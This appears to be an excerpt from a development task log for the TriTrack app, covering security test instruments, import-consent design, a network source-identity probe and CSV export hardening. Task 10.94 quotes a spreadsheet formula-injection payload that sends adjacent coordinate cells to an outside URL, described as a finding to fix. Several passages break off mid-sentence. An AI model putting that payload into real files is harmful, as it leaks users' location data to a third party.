   That's what turned into a bare `JSONDecodeError`. Fixed by a `parse_body()`
   helper (used by every call site in the file, including the `/sync/pull`
   handshake that had the same unguarded `json.loads`) that catches
   `JSONDecodeError` and, on a 404, raises `PREFLIGHT ABORT` naming the actual
   condition: *"A 404 on an auth route almost always means the server has no
   database connection … Check … whether its Postgres volume is stale or its
   credentials don't match the current .env."* Verified against a mock HTTP
   server returning exactly that shape (404, `text/plain`, `"Route not
   found"`) before touching Docker, then confirmed end-to-end: a full
   `gate_smoke_test.sh` run against a freshly-torn-down stack produced zero
   `JSONDecodeError`s and 11 of 12 instruments PASS (the 12th,
   `gate_c_adversarial_pass`, failed on exactly its four already-recorded open
   findings — Ce2/D-2, Dc/G-4, Eb/H-3, Dh — not on instrument rot).
   `GATE_SMOKE_SELFTEST=1` still passes, confirming the stale-`schema_major`
   path (a `409`, valid JSON) is unaffected by the 404/plain-text fix.

**The pass-for-the-wrong-reason enumeration.** `gate_smoke_test.sh` runs
**12** instruments, not 11 — `verify_instrument_unchecked_returns` (static,
no server) is a 12th that predates whichever count produced "eleven" above;
noted rather than silently reconciled. Verdict per instrument, most concise
form ("fresh-uuid" = signs in via `uuid.uuid4()`-based email and generates
fresh `project_id`/row UUIDs every run, so a stale row from an old run has the
wrong ID and cannot satisfy a comparison by accident):

1. `verify_instrument_unchecked_returns` — **NO RISK.** Static analysis, no
   server or DB involved at all.
2. `verify_c1_row_naming` — **NO RISK.** Fresh-uuid; every check is an
   outcome-string equality on this run's own rows.
3. `verify_c2_existence_oracle` — **NO RISK.** Fresh-uuid; the `real` vs
   `fake` project pair compared for indistinguishability is generated fresh
   each run.
4. `verify_c5_denial_audit` — **NO RISK.** DB counts are `before`/`after`
   diffs scoped to this run (mirrors the pattern applied to
   `verify_i1_source_identity` below), and the never-log check searches for a
   run-unique bait string, not a fixed one.
5. `verify_d1_per_row_oracle` — **NO RISK.** Fresh-uuid equivalence checks
   throughout.
6. `verify_h3_existence_oracle_sweep` — **NO RISK.** Same fresh-uuid pattern
   across all 11 sync tables.
7. `verify_i4_email_forgery` — **NO RISK.** Fresh-uuid users; outcome-map
   equality checks.
8. `gate_c_adversarial_pass` — **NO RISK.** Its DB-count checks are either
   `before`/`after` diffs or search for run-unique injected markers; the one
   config-only check (`Cf`) reads `docker compose config`, no DB dependency.
9. `backup_restore_drill` — **NO RISK in practice, narrow trap-failure risk
   in theory.** Owns its own compose project (`tritrack-backup-drill`), tears
   it down with `-v` in an `EXIT` trap covering every exit path. Seeded rows
   use fixed IDs with no `ON CONFLICT`, so a genuinely stale volume would hit
   a primary-key violation and abort loudly (fails safe) rather than pass
   quietly.
10. `verify_h6_archive_forgery` — **NO RISK**, same shape as #9, plus its one
    seeded row uses `ON CONFLICT DO NOTHING` (harmless if already present) and
    its `forged_marker`-count check is a compound condition that lands in an
    "inconclusive" branch rather than a false PASS if stale data is present.
11. `verify_i1_source_identity` — **RISK, found and fixed.** Owns its own
    compose project (`tritrack-i1-drill`) with `-v` in an `EXIT` trap, same as
    #9/#10 under normal termination — but unlike the wire-speaking Python
    instruments, its audit-log assertions (§3, §6) were **absolute counts
    against fixed, non-randomized client IPs** (`ATTACKER_IP`/`INNOCENT_IP`/
    `PROXY_IP` never change between runs) with no baseline. If the `EXIT` trap
    ever failed to fire (host crash, `docker kill`, daemon restart mid-run)
    and the volume survived with rows from a prior successful run at those
    same fixed addresses, a regression that stopped *this* run's requests
    from reaching the audit log could still read HELD from old rows — exactly
    the "negative control satisfied for the wrong reason" shape the task
    describes. **Fixed**: added `before`-count snapshots immediately after the
    stack comes up (before any of this run's attack traffic exists) and
    changed the two presence checks to growth checks (`after > before`),
    mirroring `verify_c5_denial_audit`'s own idiom. Re-ran standalone after
    the fix: `DRILL PASSED — 11 checks`, including the new "both real client
    addresses gained audit rows during this run's attack" line.
12. `verify_source_identity` (`--report-only`) — **NO RISK.** No Postgres at
    all; every verdict is read from `docker logs` of a container created
    fresh that run, grepped by a run-specific tag; no persistent volume is
    declared anywhere in its generated compose file.

**Status:** Done (2026-08-16). `scripts/gate_c_adversarial_baseline.json`
(4 entries: `Ce2`→§9.4, `Dc`→§9.5, `Dh`→§8.4, `Eb`→§10.7 — each cited section

logic. All four acceptance conditions proven live, not by reading the code:
brought up the `-p tritrack-gate` e2e stack fresh and ran the real instrument
— 36 held, exactly `Ce2`/`Dc`/`Dh`/`Eb` failed, baseline-matched, **exit 0**.
Then injected a fifth `held_check("Zz …", False, …)` into a working copy of
the script and re-ran against the same live stack — **exit 1**,
`UNBASELINED FAILURE: "Zz …"` — then reverted the injection (`git diff`
confirmed clean). `python3 scripts/gate_c_baseline.py --selftest` proves the
other two conditions mechanically and repeatably, against the real committed
baseline and the real security model file: a temp copy of
`TriTrack_Security_Model.md` with §9.4's body deleted makes `Ce2`'s citation
red, and a constructed run where `Dc` shows up HELD instead of FAILED makes
`BASELINE REGRESSION: Dc` red. 10.51's item 4 updated to say why this one
instrument is compared against a baseline rather than zero. Docker stack torn
down (`down`, not `-v`) after the run.
**Model:** Sonnet
**Depends on:** 10.42. **Blocks 10.51. This is a defect in 10.51's specification.**

`gate_c_adversarial_pass` reports 36 held / 4 failed, and the four are `Ce2`,
`Dc`, `Dh` and `Eb` — **the same four §10, §11, §12 and §13 each recorded as
already-known and non-blocking.** Four consecutive gates read that result,
confirmed no new failures, and assessed the gate on other grounds.

10.51 says "any red item stops the gate run." For the four suites that is
correct. For the adversarial pass it is wrong, because its expected-failure set
has never been empty — so 10.51 stops on a baseline the gate itself accepts. The
planning session wrote that rule without accounting for a check whose correct
result is not zero.

**Give the pass a committed baseline**, and design it so it cannot become a way
to make findings quiet:

- A baseline file lists each accepted failure by check ID, its finding ID, and
  the `TriTrack_Security_Model.md` section that records it as accepted and
  non-blocking.
- **A failure not in the baseline is red.** That is the whole point.
- **A baseline entry whose cited section does not exist, or does not record it
  as accepted, is red.** The baseline is downstream of the security model, never
  a parallel truth.
- **A baselined check that now passes is red** — loudly. It means something was
  fixed and the baseline must be narrowed deliberately, not left to rot into
  cover for a future regression.
- Adding an entry requires the record to exist first. No entry may be added in
  the same change that makes a check fail.

Then update 10.51's item 4 to compare against the baseline rather than against
zero, and say in its text why the two rules differ.

**Acceptance:** the current run is green with exactly four baselined entries; a
deliberately introduced fifth failure turns it red; deleting a cited security-
model section turns it red; making a baselined check pass turns it red.

### Task 10.109 — M-17: an unexplained clock advance should not be consent-free
**Status:** Done (2026-08-17). The allowance is proportional to the changes the
consent dialog shows (`explainedRevisionAdvance`), capped by the old flat
`maxUnexplainedRevisionAdvance`; §4.19 clause 4's exemption is intact. Both
halves demonstrated by running them (`untrusted_import_exemption_test.dart`,
group `M-17`): +1000 beside one filled column needs confirmation and writes
nothing, +5 beside the same addition still applies silently, an honest 30-row
restore produces no clock line, and the teammate's correction applies. The
exemption sweep found a second instance in the same row — the predicate judged
`revision` and never `updated_at`, so a payload moving only the merge tiebreak
was never judged (measured: `+4min` → `applied changes=0`); closed in the same
change. The overrule is recorded at §15.3 and §16.3 without rewriting the
original reasoning.
**Model:** **Opus** — this is a consent-design decision, not a bug fix.
**Depends on:** 10.93.

**Registered below the bar and accepted (§15.3 M-17). Michael has overruled that
and asked for a fix.** Record the overrule; do not rewrite the original
reasoning, which was correct — this is bounded, self-healing, and works exactly
as `maxUnexplainedRevisionAdvance` was specified.

**The measurement.** An archive that fills one empty column — an addition, so no
consent is owed — while advancing `revision` by exactly 1000 applies with **no
dialog and no mention of the clock.** That record is then 1000 versions ahead of
every other device's copy, and a teammate's genuine correction afterwards loses
the comparison and is reported as skipped.

**The design tension, which is the actual work.** L-2's fix bounds the advance;
§4.19 clause 4 exempts `revision` from the consent diff, and that exemption is
*correct* — `revision` changes on every honest edit, so showing it would make
the dialog noise on every legitimate import. The gap is that the exemption was
written about the field's *visibility* and the harm lives in its *magnitude*.

A direction worth considering rather than a mandate: consent could turn on the
advance being **unexplained** — larger than the visible changes justify — rather
than on the field being present. A +1 alongside one edited column is noise; a
+1000 alongside one filled column is the finding. That keeps the original
exemption's purpose intact.

- **Apply the round-7 lesson while you are here:** *wherever a control
  deliberately ignores something, that exemption is where the next problem is.*
  Enumerate §4.19's other exemptions and ask the same question of each.
- **Acceptance:** the 1000-advance case is surfaced to the user or refused; an
  ordinary honest import still produces no extra dialog noise — demonstrated,
  not asserted; a teammate's later correction to that row applies.

### Task 10.110 — `verify_source_identity.sh` cannot license any Linux host
**Status:** **Done (2026-08-19), with one half explicitly left to 10.88.** The
probe now has two stages and only one can say yes. Stage A (default) runs the
container screen and can return `COLLAPSED` or `NO VERDICT` and **never
`PRESERVED`**; Stage B (`--assisted`) prints one URL per device, waits for real
off-host traffic, reads its own access log and issues the verdict itself. There
is no flag, prompt or environment variable by which an operator can assert a
PASS. Measured, in this order: macOS Stage A `COLLAPSED`/`COLLAPSED` exit 1
(unchanged — the macOS diagnosis is not regressed); macOS Stage B driven from
**two genuinely distinct off-host LAN addresses** (`192.168.0.136` and
`192.168.0.211`, a separate bridged machine with its own MAC) — both arrived
`192.168.65.1`, decisive `COLLAPSED`, so that verdict now rests on real off-host
traffic instead of containers; Ubuntu 24.04 ARM64 Stage A **`NO VERDICT` with
the hairpin named** — the false `COLLAPSED` is gone; Ubuntu Stage B with one
real off-host caller — `192.168.0.88` recorded and classified `off-host` on
*both* shapes, so that host's publish path is confirmed to preserve a real
caller, while device 2 stayed unfilled and the run reported `NO VERDICT` and
licensed nothing; Ubuntu Stage B with traffic **manufactured on the host** (the
host itself, a container on it, and loopback) aimed at device 2 — every arm
rejected, the slot never filled, `NO VERDICT`. Controls demonstrated failing,
not asserted: `TRITRACK_PROBE_SELFTEST=blind-filter` fires control 1 and
`=break-machinery` fires control 3, both exit 1 and license nothing. Recorded at
§4.4.4 for the named configuration only; §4.4.2's description of the probe and
of its control is corrected. **What is deliberately NOT done here: the
two-device `PRESERVED` run on the candidate host.** It needs a human holding two
devices — that is the shape of the instrument, not a gap in it — and it is
task 10.88, which this task exists to unblock. Until 10.88 records it, no host
is licensed and §4.4.3's consequence stands: the exposable deployment is a
procedure, not a machine.
**Model:** **Opus** — it decides what evidence licenses exposure, same class as 10.74.
**Depends on:** 10.74. **Blocks task 10.88 and therefore the March beta.**

**Measured 2026-08-17 on Ubuntu 24.04 ARM64 under Parallels Desktop (bridged
networking), Docker installed natively.** The probe returned `COLLAPSED` for both
the `direct` and `proxied` shapes, with its negative control passing in the same
run. **A direct measurement on the same host contradicts it:**

```
traefik/whoami published on 18099, two genuinely off-host callers
  phone :  RemoteAddr = 192.168.0.153:62516
  Mac   :  RemoteAddr = 192.168.0.88:61861
```

Distinct real LAN addresses, preserved. **This host does not collapse source
identity. The probe's verdict was an artifact of its own method.**

**Why it fails.** The probe has no off-host caller. It creates a second Docker
network and has containers there dial the host's LAN address, so the traffic
leaves one bridge, touches the host, and is DNAT'd back into another bridge —
and Linux masquerades that hairpin path to the destination bridge's gateway
(`172.31.246.1`, which is the probe's own gateway, visible in its output). On
macOS the distinction does not exist, because the whole thing lives in one VM
and the collapse is real and total. **The probe was written and validated where
its method happened to be sound, and it is not sound on the platform this
project actually needs to deploy on.**

**What this costs, and why it is not merely cosmetic.** This probe is the sole
evidence that licenses `TRITRACK_TRUSTED_PROXIES=peer-verified` and
`TRITRACK_PROXY_SOURCE_IDENTITY=probe-verified`. As written it fails *every*
Linux host, so **no host can ever be licensed and no deployment can ever be
exposed.** 10.74's refusal to let the repo vouch for an unmeasured machine was
right; the instrument implementing that refusal cannot say yes to a good one.

**The design problem, which is the Opus part.** The question — *does a caller
from outside reach this host with its own address attached?* — needs two real
network endpoints. A probe holding only containers cannot manufacture one. So a
fully automatic verdict is not available on Linux, and pretending otherwise is
how the current defect happened.

The honest shape is **operator-assisted**: the probe stands up its listener,
prints the exact URL, waits for the operator to hit it from two distinct
devices, then reads its own observations and issues the verdict itself. The
operator supplies the traffic; the probe supplies the judgment. Do not let the
operator type the conclusion.

- **Keep the macOS diagnosis.** On Docker Desktop the collapse is genuine and
  the current method detects it correctly. Do not regress that — the fix adds a
  path that can say yes, it does not remove the one that says no.
- **The negative control needs re-examining too.** It passed while the verdicts
  were wrong, which means it proved the probe could tell preservation from
  collapse *on the on-network path* and nothing about the off-host path the
  verdicts describe. A control that passes beside a wrong answer is the shape
  §12.11 exists for.
- **Record the measurement above in §4.4.3** as evidence for that named
  configuration — Ubuntu 24.04 ARM64, Parallels bridged, native Docker. Not
  "Linux is fine." That generalisation is exactly what 10.74 refused to write.
- **Acceptance:** the probe issues a PASS on this host with real off-host
  callers; it still issues COLLAPSED on Docker Desktop for macOS; a deliberately
  wrong operator claim cannot produce a PASS; the control is proved to fail when
  the off-host path is genuinely broken, not only when the on-network path is.

### Task 10.86 — Signing imported archives and share payloads (one task, both formats)
**Status:** **Deferred — Phase 11 dependency.** Numbered here so it is tracked,
not scheduled here.
**Model:** **Opus** when it runs.

Nothing authenticates a `.zip` or a `TT1:` payload, so §4.19.2's guarantee is
visibility and recoverability rather than **prevention**: a file can still create
records, and the email dedup can attribute those created records to a person the

  poor thing to ask someone to agree to. **A consent control nobody can read is
  theatre, and theatre is worse than absence**, because it transfers blame to
  the user while providing none of the protection. Design a grouped or per-table
  summary that stays honest at that size: what changed, how many, and which are
  destructive.
- **An honest whole-project restore now writes one `Sync_Conflicts` row per
  updated row** — clause 4's recoverability half working, and also several
  thousand unreviewed entries after a large merge. Task 10.12's surface was
  built for the occasional sync overwrite. Decide: group an import's conflicts
  under one reviewable event, or accept the volume and say so in §4.19.2. **A
  review queue nobody will read is the same failure as the dialog**, one screen
  over.

**Acceptance:** both surfaces stay truthful at 1,000 rows *and* stay usable —
demonstrated at that size, not at three.

### Task 10.93 — L-2: the untrusted-import rules' two coverage gaps
**Status:** **Done** (2026-08-17, task gate-d-close). All three closed and
neutralisation-tested — §15.10.

- **L-2 took two bounds, because the finding has two independent harms.**
  *Ceiling arm:* `UntrustedImportRules.maxImportedRevision` is the largest
  `revision` a payload may **carry**, as against `maxRevision`, the largest the
  device will **hold** — the gap is the device's own edit budget. **A bound that
  admits a value it will later refuse is not a bound.** Enforced on both
  untrusted paths (`checkClock` and `ObservationShare.decode`, which had the
  identical hole). *Freeze arm:* the exemption list is now **derived** from the
  corrected criterion — a column is exempt only if it moves on every honest edit
  *and* the merge does not read it, leaving `last_modified_by` alone — and the
  merge clock is judged as one thing by `isUnexplainedRevisionAdvance`, shown
  when the payload cannot account for it and silent when it can, so the *noise*
  property the exemption existed for survives with a test that says so.
  `_showMergeReport` is now `ImportReportContent` and names every refusal.
  **The exemption sweep §4.19.3 asks the same question of the other eight
  exemptions in §4.19** — two were already findings (K-8, L-12), six hold with
  the reason recorded.
- **L-12** derives from `SyncTable.deactivationColumns`; the sweep for a third
  deactivation column is a repository-layer grep test whose detector is itself
  checked against `ProjectMembershipRepository`'s own clause.
- **L-6** fixed at the defect: `_applyUserRemap` mutated the caller's
  `ProjectBackup`, so the second (consenting) `merge()` recomputed an empty
  remap. Now `_remappedRows`, which returns rows and shares the untouched ones.
**Model:** **Opus** — clause design, and one arm is silent permanent data loss.
**Depends on:** 10.73. **Blocking — Gate D.** §14.3, §15.1, §15.4.

Carries **L-2** (blocking), **L-6** and **L-12** (registered, scheduled).

- **L-2 — the exempted column the merge reads.** An archive changing *nothing
  but* `revision`, to exactly the legal ceiling, applies with
  `changes=0 destructive=0 issues=0` and no dialog. One honest edit later the
  row exceeds the ceiling and **the user's own export will not restore on a
  replacement device**; meanwhile every genuine correction from a teammate is
  discarded as "local was newer." Reproduced end to end.
  The design lesson is the fix's shape: **clause 4's exemption criterion —
  "this column moves on every honest edit" — is sound for a column whose value
  is *ignored* and unsound for one the merge *reads*.** `revision` is the
  merge's ordering key. Re-derive the exemption list from that criterion rather
  than patching one entry, and show the user a `revision` jump they did not
  cause. Also: `_showMergeReport` renders `Refused …: 1` and never renders
  `report.issues` (`data_export_screen.dart:352-360`) — a record dropped from a
  disaster recovery gets a number and no name. Fix that too; it is how L-2
  stays invisible.
- **L-12 — the deactivation column the destructive predicate does not know.**
  `UntrustedImportRules.isDestructiveChange` enumerates `deleted_at` by hand, so
  an archive setting `Project_Memberships.end_date` applies with
  `destructiveChanges=0` and no dialog. **Fix the class:** derive the predicate
  from a declared set the way clause 2 derives from
  `SyncTable.identityUserColumns`. Bounded today only because the server refuses
  the row and the owner self-heals — a third deactivation column on
  `Observations` would be B1.
- **L-6 — the count that reads zero exactly when it matters.**
  `data_export_screen.dart` calls `merge()` twice on the same `ProjectBackup`;
  pass 1 rewrites the incoming rows in place, so pass 2's remap is empty and
  `rowsReattributed`/`usersDeduped` are `0` on the hostile import §4.19.2 says
  they are owed for. **Remove the mutating-preview shape, not just the count** —
  a plan pass that mutates its input is the defect.

**Acceptance:** each of the three reproduced first as a failing test, and clause
4's exemption list neutralised in turn to prove no clause is guarded only by
tests another satisfies — the standard 10.61/10.73 set.

### Task 10.94 — L-3: the CSV boundary, in both directions
**Status:** **Done** (2026-08-17, task gate-d-close). §15.10.

- **L-3** closed at **one** choke point (`SpreadsheetSafeCsv`), not three call
  sites, with a grep test that fails if any file under `lib/` calls
  `Csv().encode` directly — the encoder that matters is the one nobody has
  written yet. **Proven by opening the file in Microsoft Excel, not by reading
  the escaping code**: before, cell B2 evaluated and returned
  `35.1983|-111.6513` (the coordinates from H2/I2); after, `has formula: false`
  and the coordinates still parse as numbers. Numbers are exempt from the
  escape deliberately — the standard prefix would apostrophe every longitude in
  the western hemisphere.
- **The outbound question is now written into the enumeration** as §4.19.4, for
  all seven formats the app writes — including the four (the `.zip`, its cloud
  upload, the `TT1:` payload, the two local caches) that need nothing, so the
  next reader does not re-derive it.
- **L-15** produces a `TagImportRow.warning`, kept separate from `issues`
  because an issue drops the row and dropping a tag over a colour would turn a
  cosmetic problem into the loss the fallback prevents.
- **M-2** moved out of the widget into `TagCsvCommit` — one transaction, with
  the all-or-nothing property tested against a real mid-loop rejection.
**Model:** **Opus** — the export half is asset 1 leaving from a third party's machine.
**Depends on:** nothing. **Blocking — Gate D.** §14.4, §15.1, §15.4.

Carries **L-3** (blocking), **L-15** and **M-2** (registered, scheduled).

- **L-3 — export.** Every encoder calls `Csv().encode(rows)` with default
  quoting and there is **no formula neutralisation anywhere in the repository**
  (`observation_csv.dart:88`, `tag_csv_export.dart:41`,
  `non_detection_csv.dart:70`). A `tag_name` of
  `=WEBSERVICE("http://…"&TEXTJOIN(",",1,H2,I2))` reads the latitude and
  longitude columns sitting beside it and fires an outbound request the moment a
  colleague opens the file. Reachable from outside the team: an insert-only
  archive needs no consent, so a hostile `.zip` plants the tag and the app
  reports "Inserted: 1."
  Apply a standard prefix escape at **one** choke point every encoder passes
  through — not three call sites — and test it on every text column of every
  encoder, including `observer_name` and `notes`.
- **L-15 — import silently recolours.** `tag_csv_import.dart:161-166` falls back
  to a palette colour on an invalid `color_hex` and adds nothing to `issues`;
  the screen then reports *"Imported N tags (0 skipped)."* Phase 4.4 made tag
  colour the map legend key.
- **M-2 — the commit loop is unguarded and untransacted.**
  `tag_database_screen.dart:183-193` has no try/catch and no transaction, so one
  rejected row throws mid-loop, leaving a partial import with no rollback and no
  message — the success snackbar is never reached. Reachable from 10.97's `NaN`
  finding, which is how a row gets rejected.

**What §14.4 asks to be kept, and it generalises past CSV:** §4.19.1 enumerated
every import path and asked *"can it modify an existing row?"* — a correct axis,
and an incomplete one. **A row that is only ever inserted is still a weapon on
the way back out.** Export was not on the list. Add the outbound question to the
enumeration, for every format the app writes.

### Task 10.95 — the measurement stack: the gate's instruments must establish their own result
**Status:** Done (2026-08-16).
- **L-16 — root cause was a real-clock race, not order/concurrency:**
  `map_screen_test.dart`'s live tag-color update test paired a fixed 300ms
  `Future.delayed` with `_mapDataProvider`'s isolate-backed sqflite query,
  which is serialized against every other test file's own
  `sqflite_common_ffi` traffic through that plugin's single process-wide
  background isolate — fine in isolation, contended under full-suite
  concurrency. Replaced the fixed delay with a bounded poll
  (`pumpUntil`, 10s timeout) that treats the transient loading-spinner state
  as "not yet" rather than a crash. Proven with **three consecutive full
  `flutter test` runs, all green (898 passed / 9 skipped, exit 0)**.
- **L-4 — `gate_c_baseline.py` now keys on the full held_check() name**, not
  its colliding leading token; the citation check now also requires the
  entry's own `finding_id` (or its significant words) to appear in the cited
  section, not just any accepted-word hit; `evaluate()` now asserts an
  `expected_check_count` (40, stable regardless of the `A4`/LAN-availability
  branch) so a lost or added check is caught. `--selftest` proves all of
  this, plus a regression test for the exact leading-token-collision shape
  L-4 found. **All four of task 10.91's original acceptance conditions
  re-proven live** against a fresh `-p tritrack-gate` e2e stack: current run
  green with exactly the four baselined entries (36 held / 4 failed, exit
  0); a fifth injected failure (`Zz ...`) turns it red (exit 1,
  `UNBASELINED FAILURE`), reverted after (`git diff` clean); deleting a

- **L-13 — `backup_restore_drill.sh`'s `.part` check** now asserts the
  backup directory exists before trusting an empty `find` result, instead of

  fails loudly). `verify_instrument_unchecked_returns.py` extended with an

- **Full proof, live:** `gate_smoke_test.sh` (normal) — **all 13

**Model:** **Opus** — L-16 is a diagnosis, not a fix. (Run at Sonnet per
session default; diagnosis confirmed by reproducing the pre-fix failure

**Depends on:** 10.90, 10.91. **Blocks a trustworthy verdict on both gates.** §15.2.

Not a §4-bar finding. It blocks because §6's exit criteria name the mechanisms

default suite green across **three consecutive** full runs. Carries **L-4**,
